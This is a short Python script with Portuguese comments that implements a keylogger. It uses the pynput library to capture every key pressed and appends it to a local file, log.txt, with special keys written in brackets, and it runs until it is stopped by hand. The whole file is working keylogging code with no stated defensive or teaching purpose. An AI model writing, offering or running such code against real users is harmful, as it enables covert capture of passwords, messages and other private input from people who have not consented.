# Import da biblioteca que vai "escutar" o teclado
from pynput import keyboard

# Nome do arquivo onde as teclas serão gravadas
log_file = "log.txt"

# Toda vez que uma tecla for pressionada
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Se for uma tecla especial salvara com colchetes
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

# Inicia o "ouvinte" de teclas
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    
# O programa ficará rodando até ser interrompido manualmente